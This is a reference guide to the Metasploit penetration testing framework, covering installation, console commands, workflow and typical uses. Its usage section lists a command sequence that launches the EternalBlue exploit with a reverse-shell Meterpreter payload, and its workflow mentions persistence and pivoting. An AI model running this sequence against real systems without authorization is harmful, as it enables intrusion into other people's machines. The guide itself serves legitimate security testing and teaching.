# Metasploit Framework

## Purpose
Metasploit Framework is an advanced penetration testing platform that enables security professionals to develop, test, and execute exploit code against remote targets. It provides a comprehensive environment for vulnerability exploitation, payload generation, post-exploitation, and security assessment automation. Created by HD Moore in 2003 and now maintained by Rapid7, Metasploit is the most widely used exploitation framework in the cybersecurity industry.

## Installation
On Kali Linux, Metasploit is pre-installed. To install on Debian/Ubuntu:
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```
On Arch Linux: `sudo pacman -S metasploit`
On macOS: `brew install metasploit`
Alternatively, use the nightly installer from the official Rapid7 GitHub releases.

## Basic Usage
Launch the console with `msfconsole`. From the interactive shell, you can search for modules, configure exploits, set payloads, and launch attacks. A typical workflow:
```
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.10
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.10.1
msf6 > set LPORT 4444
msf6 > run
```

## Important Commands
- `search <keyword>` - search for modules by name, CVE, or description
- `use <module_path>` - load a specific module
- `show options` - display configurable parameters for the loaded module
- `show payloads` - list compatible payloads for the current exploit
- `set <option> <value>` - set a module parameter
- `setg <option> <value>` - set a global parameter across all modules
- `run` / `exploit` - execute the module
- `back` - unload the current module
- `sessions -l` - list active sessions
- `sessions -i <id>` - interact with a session
- `info` - display detailed module information
- `check` - test if a target is vulnerable without exploiting
- `db_status` - check database connection status
- `workspace -a <name>` - create a new workspace
- `hosts` - list discovered hosts in the database
- `services` - list discovered services in the database

## Typical Workflow
1. Start `msfconsole` and optionally `systemctl start postgresql` for database features
2. Create a workspace: `workspace -a engagement_name`
3. Import Nmap scan results: `db_import scan.xml`
4. Search for relevant exploits matching discovered services
5. Select and configure an exploit with appropriate payload
6. Set target (RHOSTS) and listener (LHOST/LPORT)
7. Execute `check` to verify vulnerability, then `run` to exploit
8. On successful exploitation, interact with the Meterpreter session
9. Perform post-exploitation tasks (privilege escalation, persistence, pivoting)

## Advantages
- Largest collection of tested exploit modules available (over 3,500+ exploits, 500+ payloads)
- Active community and regular updates with new CVEs
- Integrated payload generation with MSFvenom
- Database-backed for tracking hosts, services, and credentials
- Extensive post-exploitation capabilities through Meterpreter
- Supports automation via resource scripts and the MSF RPC API

## Limitations
- Signature-based detection by modern antivirus and EDR solutions
- Requires careful payload configuration to avoid network detection
- Some modules may be unreliable due to target environment variability
- Can be overwhelming for beginners due to the sheer number of options
- Not a substitute for manual vulnerability research and understanding

## Industry Use
Metasploit is used by penetration testers for red team engagements, by security researchers for PoC development, by SOC teams for simulating attacks, and in educational settings for teaching exploitation fundamentals. It is also used in enterprise vulnerability management programs to validate scanner findings.

## Official Documentation
- Official Site: https://www.metasploit.com
- Documentation: https://docs.metasploit.com
- GitHub: https://github.com/rapid7/metasploit-framework
- Module Database: https://www.rapid7.com/db/
